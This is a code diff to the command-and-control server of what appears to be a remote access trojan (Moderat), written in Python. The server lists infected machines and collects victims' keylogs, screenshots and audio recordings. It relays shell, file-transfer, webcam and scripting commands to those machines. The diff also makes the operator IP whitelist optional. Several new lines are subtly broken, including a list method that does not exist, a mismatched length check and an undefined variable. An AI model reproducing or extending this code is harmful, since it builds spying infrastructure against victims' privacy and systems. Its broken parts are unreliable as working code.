@@ -48,14 +48,17 @@ manageAudio = AudioManager()
 # Clear Clients Status
 manageClients.set_status_zero()
 
-white_list = ['127.0.0.1',]
-
+if os.path.exists('white_list_ip.txt'):
+    with open('white_list_ip.txt', 'r') as ip_list:
+        white_list = [ip for ip in ip_list.readlines().replace('\n', '')]
+else:
+    white_list = False
 
 def has_valid_ip(func):
     def wrapper(*args, **kwargs):
         server_object = args[0]
         ip_address = server_object.transport.getPeer().host
-        if not ip_address in white_list:
+        if white_list and not ip_address in white_list:
             log.critical('[*SERVER] Unknown IP Address Detected [{}]'.format(ip_address))
             return
         else:
@@ -129,8 +132,9 @@ class ModeratServerProtocol(LineReceiver):
         elif command['from'] == 'moderator':
             if not command['mode'] == 'getModerators' and not command['mode'] == 'getClients':
                 log.info('[*RECV] [Moderator: %s] [Mode: (%s)]' % (self.transport.getPeer().host, command['mode']))
-            self.moderator_commands(command)
+            self.moderator_commands(command['payload'], command['mode'], command['session_id'], command['to'], command['module_id'])
 
+    # Client Commands
     def client_commands(self, payload, mode, session_id, key, module_id):
 
         # Build Client
@@ -222,17 +226,18 @@ class ModeratServerProtocol(LineReceiver):
         else:
             log.error('[*ERROR] Invalid Mode (%s)' % mode)
 
+    # Moderator Commands
     @has_valid_ip
-    def moderator_commands(self, data):
+    def moderator_commands(self, payload, mode, session_id, client_key, module_id):
 
-        if data['mode'] == 'moderatorInitializing':
+        if mode == 'moderatorInitializing':
 
             # Initializing Moderator
             log.debug('[*MODERATOR] Initializing Moderator [FROM: %s]' % self.transport.getPeer().host)
-            if data['payload'].startswith('auth '):
-                credentials = data['payload'].split()
+            if payload.startswith('auth '):
+                credentials = payload.split()
                 if len(credentials) == 3:
-                    command, username, password = data['payload'].split()
+                    command, username, password = payload.split()
 
                     # If Login Success
                     if manageModerators.login_user(username, password):
@@ -243,8 +248,8 @@ class ModeratServerProtocol(LineReceiver):
                         self.send_message_to_moderator(self, 'loginSuccess %s' % privileges, 'moderatorInitializing')
 
                         # Create Session For Moderator and Save
-                        log.debug('[*MODERATOR] Create Session for Moderator (%s)' % data['session_id'])
-                        moderators[data['session_id']] = {'username': username, 'socket': self}
+                        log.debug('[*MODERATOR] Create Session for Moderator (%s)' % session_id)
+                        moderators[session_id] = {'username': username, 'socket': self}
 
                         # Set Moderator Last Online
                         manageModerators.set_last_online(username, datetime.datetime.now())
@@ -259,213 +264,220 @@ class ModeratServerProtocol(LineReceiver):
                 else:
                     log.critical('[*MALFORMED] Moderator Login Data')
 
-        elif data['mode'] == 'getClients' and data['session_id'] in moderators:
+        # Initialized Moderator
+        elif moderators.has_key(session_id):
 
-            if self.is_administrator(data['session_id']):
-                clients_ids = []
-                temp_clients_ids = manageClients.get_all_clients()
-                for client_id in temp_clients_ids:
+            moderator_username = moderators[session_id]['username']
+
+            if mode == 'getClients' and session_id in moderators:
+
+                if manageModerators.get_privs(moderator_username) == 1:
+                    clients_ids = []
+                    temp_clients_ids = manageClients.get_all_clients()
+                    for client_id in temp_clients_ids:
+                        _id = client_id[0]
+                        if manageModerators.get_privs(manageClients.get_moderator(_id)) == 0 or moderator_username == manageClients.get_moderator(_id):
+                            clients_ids.append(client_id)
+                else:
+                    clients_ids = manageClients.get_clients(moderator_username)
+                shared_clients = {}
+
+                # for online clients
+                for client_id in clients_ids:
                     _id = client_id[0]
-                    if manageModerators.get_privs(manageClients.get_moderator(_id)) == 0 or moderators[data['session_id']]['username'] == manageClients.get_moderator(_id):
-                        clients_ids.append(client_id)
-            else:
-                clients_ids = manageClients.get_clients(moderators[data['session_id']]['username'])
-            shared_clients = {}
-
-            # for online clients
-            for client_id in clients_ids:
-                _id = client_id[0]
-                # Online Clients
-                if clients.has_key(_id) and clients[_id].has_key('os_type'):
-                    shared_clients[_id] = {
-                        'moderator':            manageClients.get_moderator(_id),
-                        'alias':                manageClients.get_alias(_id),
-                        'ip_address':           clients[_id]['ip_address'],
-                        'os_type':              clients[_id]['os_type'],
-                        'os':                   clients[_id]['os'],
-                        'user':                 clients[_id]['user'],
-                        'privileges':           clients[_id]['privileges'],
-                        'audio_device':         clients[_id]['audio_device'],
-                        'webcamera_device':     clients[_id]['webcamera_device'],
-                        'window_title':         clients[_id]['window_title'],
-                        'key':                  clients[_id]['key'],
-                        'kts':                  clients[_id]['kts'],
-                        'kt':                   clients[_id]['kt'],
-                        'ats':                  clients[_id]['ats'],
-                        'at':                   clients[_id]['at'],
-                        'sts':                  clients[_id]['sts'],
-                        'std':                  clients[_id]['std'],
-                        'st':                   clients[_id]['st'],
-                        'status':               True
-                    }
-                # Offline Clients
-                else:
-                    shared_clients[client_id] = {
-                        'moderator':    manageClients.get_moderator(_id),
-                        'key':           _id,
-                        'alias':        manageClients.get_alias(_id),
-                        'ip_address':   manageClients.get_ip_address(_id),
-                        'last_online':  manageClients.get_last_online(_id),
-                        'status':       False
-                    }
-            self.send_message_to_moderator(self, shared_clients, 'getClients')
-
-        # Set Alias For Client
-        elif data['mode'] == 'setAlias':
-            alias_data = data['payload'].split()
-            if len(alias_data) == 2:
-                alias_client, alias_value = alias_data
-                log.debug('[*SERVER] Set Alias (%s) For (%s)' % (alias_value, self.transport.getPeer().host))
-                manageClients.set_alias(alias_client, alias_value)
-            else:
-                log.critical('[*MALFORMED] [MODE: %s]' % data['mode'])
-
-        elif data['mode'] == 'countData':
-            screen_data = data['payload'].split()
-            if len(screen_data) == 2:
-                client_id, date = screen_data
-                counted_data = {
-                    'screenshots': {
-                        'new': manageScreenshots.get_screenshots_count_0(client_id, date),
-                        'old': manageScreenshots.get_screenshots_count_1(client_id, date)
-                    },
-                    'keylogs': {
-                        'new': manageKeylogs.get_keylogs_count_0(client_id, date),
-                        'old': manageKeylogs.get_keylogs_count_1(client_id, date)
-                    },
-                    'audio': {
-                        'new': manageAudio.get_audios_count_0(client_id, date),
-                        'old': manageAudio.get_audios_count_1(client_id, date)
-                    }
-                }
-
-                self.send_message_to_moderator(self, counted_data, data['mode'], module_id=data['module_id'])
-            else:
-                log.critical('[*MALFORMED] [MODE: %s]' % data['mode'])
-
-        elif data['mode'] == 'downloadLogs':
-            if type(data['payload']) == dict:
-                download_info = data['payload']
-                # Get All Logs
-                if download_info['screenshot']:
-                    screenshots = manageScreenshots.get_all_new_screenshots(download_info['client_id'], download_info['date']) \
-                        if download_info['filter'] else manageScreenshots.get_all_screenshots(download_info['client_id'], download_info['date'])
-                else:
-                    screenshots = []
-                if download_info['keylog']:
-                    keylogs = manageKeylogs.get_all_new_keylogs(download_info['client_id'], download_info['date']) \
-                        if download_info['filter'] else manageKeylogs.get_all_keylogs(download_info['client_id'], download_info['date'])
-                else:
-                    keylogs = []
-                if download_info['audio']:
-                    audios = manageAudio.get_all_new_audios(download_info['client_id'], download_info['date']) \
-                        if download_info['filter'] else manageAudio.get_all_audios(download_info['client_id'], download_info['date'])
-                else:
-                    audios = []
-
-                # Send Counted Logs
-                counted_logs = {
-                    'screenshots': len(screenshots),
-                    'keylogs': len(keylogs),
-                    'audios': len(audios),
-                }
-                self.send_message_to_moderator(self, counted_logs, data['mode'], module_id=data['module_id'])
-
-                # Start Send Screenshots
-                for screenshot in screenshots:
-                    if os.path.exists(screenshot[2]):
-                        screenshot_info = {
-                            'type':         'screenshot',
-                            'datetime':     screenshot[1],
-                            'raw':          open(screenshot[2], 'rb').read(),
-                            'window_title': screenshot[3],
-                            'date':         screenshot[4]
+                    # Online Clients
+                    if clients.has_key(_id) and clients[_id].has_key('os_type'):
+                        shared_clients[_id] = {
+                            'moderator':            manageClients.get_moderator(_id),
+                            'alias':                manageClients.get_alias(_id),
+                            'ip_address':           clients[_id]['ip_address'],
+                            'os_type':              clients[_id]['os_type'],
+                            'os':                   clients[_id]['os'],
+                            'user':                 clients[_id]['user'],
+                            'privileges':           clients[_id]['privileges'],
+                            'audio_device':         clients[_id]['audio_device'],
+                            'webcamera_device':     clients[_id]['webcamera_device'],
+                            'window_title':         clients[_id]['window_title'],
+                            'key':                  clients[_id]['key'],
+                            'kts':                  clients[_id]['kts'],
+                            'kt':                   clients[_id]['kt'],
+                            'ats':                  clients[_id]['ats'],
+                            'at':                   clients[_id]['at'],
+                            'sts':                  clients[_id]['sts'],
+                            'std':                  clients[_id]['std'],
+                            'st':                   clients[_id]['st'],
+                            'status':               True
                         }
-                        self.send_message_to_moderator(self, screenshot_info, 'downloadLog', module_id=data['module_id'])
-                        manageScreenshots.set_screenshot_viewed(screenshot[1])
+                    # Offline Clients
                     else:
-                        log.info('[*SERVER] File Not Found Delete Entry (%s)' % screenshot[2])
-                        manageScreenshots.delete_screenshot(screenshot[1])
-
-                # Start Send Keylogs
-                for keylog in keylogs:
-                    if os.path.exists(keylog[3]):
-                        keylog_info = {
-                            'type':     'keylog',
-                            'datetime': keylog[1],
-                            'date':     keylog[2],
-                            'raw':      open(keylog[3], 'rb').read()
+                        shared_clients[client_id] = {
+                            'moderator':    manageClients.get_moderator(_id),
+                            'key':           _id,
+                            'alias':        manageClients.get_alias(_id),
+                            'ip_address':   manageClients.get_ip_address(_id),
+                            'last_online':  manageClients.get_last_online(_id),
+                            'status':       False
                         }
-                        self.send_message_to_moderator(self, keylog_info, 'downloadLog', module_id=data['module_id'])
-                        manageKeylogs.set_keylog_viewed(keylog[1])
-                    else:
-                        log.info('[*SERVER] File Not Found Delete Entry (%s)' % keylog[3])
-                        manageKeylogs.delete_keylog(keylog[1])
+                self.send_message_to_moderator(self, shared_clients, 'getClients')
 
-                # Start Send Audios
-                for audio in audios:
-                    if os.path.exists(audio[3]):
-                        audio_info = {
-                            'type':     'audio',
-                            'datetime': audio[1],
-                            'date':     audio[2],
-                            'raw':      open(audio[3], 'rb').read()
+            # Set Alias For Client
+            elif mode == 'setAlias':
+                alias_data = payload.split()
+                if len(alias_data) == 2:
+                    alias_client, alias_value = alias_data
+                    log.debug('[*SERVER] Set Alias (%s) For (%s)' % (alias_value, self.transport.getPeer().host))
+                    manageClients.set_alias(alias_client, alias_value)
+                else:
+                    log.critical('[*MALFORMED] [MODE: %s]' % mode)
+
+            elif mode == 'countData':
+                screen_data = payload.split()
+                if len(screen_data) == 2:
+                    client_id, date = screen_data
+                    counted_data = {
+                        'screenshots': {
+                            'new': manageScreenshots.get_screenshots_count_0(client_id, date),
+                            'old': manageScreenshots.get_screenshots_count_1(client_id, date)
+                        },
+                        'keylogs': {
+                            'new': manageKeylogs.get_keylogs_count_0(client_id, date),
+                            'old': manageKeylogs.get_keylogs_count_1(client_id, date)
+                        },
+                        'audio': {
+                            'new': manageAudio.get_audios_count_0(client_id, date),
+                            'old': manageAudio.get_audios_count_1(client_id, date)
                         }
-                        self.send_message_to_moderator(self, audio_info, 'downloadLog', module_id=data['module_id'])
-                        manageAudio.set_audio_viewed(audio[1])
+                    }
+
+                    self.send_message_to_moderator(self, counted_data, mode, module_id=module_id)
+                else:
+                    log.critical('[*MALFORMED] [MODE: %s]' % mode)
+
+            elif mode == 'downloadLogs':
+                if type(payload) == dict:
+                    download_info = payload
+                    # Get All Logs
+                    if download_info['screenshot']:
+                        screenshots = manageScreenshots.get_all_new_screenshots(download_info['client_id'], download_info['date']) \
+                            if download_info['filter'] else manageScreenshots.get_all_screenshots(download_info['client_id'], download_info['date'])
                     else:
-                        log.info('[*SERVER] File Not Found Delete Entry (%s)' % audio[3])
-                        manageAudio.delete_audios(audio[1])
+                        screenshots = []
+                    if download_info['keylog']:
+                        keylogs = manageKeylogs.get_all_new_keylogs(download_info['client_id'], download_info['date']) \
+                            if download_info['filter'] else manageKeylogs.get_all_keylogs(download_info['client_id'], download_info['date'])
+                    else:
+                        keylogs = []
+                    if download_info['audio']:
+                        audios = manageAudio.get_all_new_audios(download_info['client_id'], download_info['date']) \
+                            if download_info['filter'] else manageAudio.get_all_audios(download_info['client_id'], download_info['date'])
+                    else:
+                        audios = []
 
-                self.send_message_to_moderator(self, {'type': 'endDownloading',}, 'downloadLog', module_id=data['module_id'])
+                    # Send Counted Logs
+                    counted_logs = {
+                        'screenshots': len(screenshots),
+                        'keylogs': len(keylogs),
+                        'audios': len(audios),
+                    }
+                    self.send_message_to_moderator(self, counted_logs, mode, module_id=module_id)
+
+                    # Start Send Screenshots
+                    for screenshot in screenshots:
+                        if os.path.exists(screenshot[2]):
+                            screenshot_info = {
+                                'type':         'screenshot',
+                                'datetime':     screenshot[1],
+                                'raw':          open(screenshot[2], 'rb').read(),
+                                'window_title': screenshot[3],
+                                'date':         screenshot[4]
+                            }
+                            self.send_message_to_moderator(self, screenshot_info, 'downloadLog', module_id=module_id)
+                            manageScreenshots.set_screenshot_viewed(screenshot[1])
+                        else:
+                            log.info('[*SERVER] File Not Found Delete Entry (%s)' % screenshot[2])
+                            manageScreenshots.delete_screenshot(screenshot[1])
+
+                    # Start Send Keylogs
+                    for keylog in keylogs:
+                        if os.path.exists(keylog[3]):
+                            keylog_info = {
+                                'type':     'keylog',
+                                'datetime': keylog[1],
+                                'date':     keylog[2],
+                                'raw':      open(keylog[3], 'rb').read()
+                            }
+                            self.send_message_to_moderator(self, keylog_info, 'downloadLog', module_id=module_id)
+                            manageKeylogs.set_keylog_viewed(keylog[1])
+                        else:
+                            log.info('[*SERVER] File Not Found Delete Entry (%s)' % keylog[3])
+                            manageKeylogs.delete_keylog(keylog[1])
+
+                    # Start Send Audios
+                    for audio in audios:
+                        if os.path.exists(audio[3]):
+                            audio_info = {
+                                'type':     'audio',
+                                'datetime': audio[1],
+                                'date':     audio[2],
+                                'raw':      open(audio[3], 'rb').read()
+                            }
+                            self.send_message_to_moderator(self, audio_info, 'downloadLog', module_id=module_id)
+                            manageAudio.set_audio_viewed(audio[1])
+                        else:
+                            log.info('[*SERVER] File Not Found Delete Entry (%s)' % audio[3])
+                            manageAudio.delete_audios(audio[1])
+
+                    self.send_message_to_moderator(self, {'type': 'endDownloading',}, 'downloadLog', module_id=module_id)
 
 
-        # ADMIN PRIVILEGES
-        # Get Moderators List
-        elif data['mode'] == 'getModerators' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
-            all_moderators = manageModerators.get_moderators()
-            result = {}
-            for moderator in all_moderators:
-                all_clients_count = len(ClientsManagment().get_clients(moderator[0]))
-                offline_clients_count = len(ClientsManagment().get_offline_clients(moderator[0]))
-                result[moderator[0]] = {
-                    'privileges': moderator[2],
-                    'offline_clients': offline_clients_count,
-                    'online_clients': all_clients_count - offline_clients_count,
-                    'status': moderator[3],
-                    'last_online': moderator[4],
-                }
-            self.send_message_to_moderator(self, result, 'getModerators')
+            # ADMIN PRIVILEGES
+            # Get Moderators List
+            elif mode == 'getModerators' and manageModerators.get_privs(moderator_username) == 1:
+                all_moderators = manageModerators.get_moderators()
+                result = {}
+                for moderator in all_moderators:
+                    all_clients_count = len(ClientsManagment().get_clients(moderator[0]))
+                    offline_clients_count = len(ClientsManagment().get_offline_clients(moderator[0]))
+                    result[moderator[0]] = {
+                        'privileges': moderator[2],
+                        'offline_clients': offline_clients_count,
+                        'online_clients': all_clients_count - offline_clients_count,
+                        'status': moderator[3],
+                        'last_online': moderator[4],
+                    }
+                self.send_message_to_moderator(self, result, 'getModerators')
 
-        # Add Moderator
-        elif data['mode'] == 'addModerator' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
-            username, password, privileges = data['payload'].split()
-            manageModerators.create_user(username, password, int(privileges))
+            # Add Moderator
+            elif mode == 'addModerator' and manageModerators.get_privs(moderator_username) == 1:
+                credentials_list = payload.split()
+                if len(credentials_list) == 3:
+                    username, password, privileges = credentials_list
+                    manageModerators.create_user(username, password, int(privileges))
+                    log.info('Moderator ({0}) Created With Password: ({1}), Privileges: ({2})'.format(username, password.replace(password[3:], '*'), privileges))
 
-        elif data['mode'] == 'setModerator' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
-            client_id, moderator_id = data['payload'].split()
-            manageClients.set_moderator(client_id, moderator_id)
-            log.info('Moderator Changed For Client (%s) to (%s)' % (client_id, moderator_id))
+            elif mode == 'setModerator' and manageModerators.get_privs(moderator_username) == 1:
 
-        # FILTERS
-        # For Only Administrators
-        elif data['mode'] in ['terminateClient',] \
-                and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
-            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
-        # For Moderators
-        elif data['mode'] in ['getScreen', 'getWebcam', 'setLogSettings', 'updateSource',
-                              'shellMode', 'explorerMode', 'terminateProcess', 'scriptingMode',
-                              'downloadMode', 'uploadMode',]:
-            try:
-                self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'], module_id=data['module_id'])
-            except KeyError:
-                pass
-        else:
-            log.critical('[*MALFORMED] [MODE: %s]' % data['mode'])
+                ids_list = payload.split()
+                if len(ids_list) == 3:
+                    client_id, moderator_id = ids_list
+                    manageClients.set_moderator(client_id, moderator_id)
+                    log.info('Moderator Changed For Client (%s) to (%s)' % (client_id, moderator_id))
 
-    @staticmethod
-    def is_administrator(session_id):
-        return True if manageModerators.get_privs(moderators[session_id]['username']) == 1 else False
+            # FILTERS
+            # For Only Administrators
+            elif mode in ['terminateClient',] \
+                    and manageModerators.get_privs(moderator_username) == 1:
+                self.send_message_to_client(clients[client_key]['socket'], payload, mode, session_id=session_id)
+            # For Moderators
+            elif mode in ['getScreen', 'getWebcam', 'setLogSettings', 'updateSource',
+                                  'shellMode', 'explorerMode', 'terminateProcess', 'scriptingMode',
+                                  'downloadMode', 'uploadMode',]:
+                try:
+                    self.send_message_to_client(clients[client_key]['socket'], payload, mode, session_id=session_id, module_id=data['module_id'],)
+                except KeyError:
+                    pass
+            else:
+                log.critical('[*MALFORMED] [MODE: %s]' % mode)
 
     # Send Message To Client
     def send_message_to_client(self, client, message, mode, _from='server', session_id='', module_id='', end='[ENDOFMESSAGE]'):
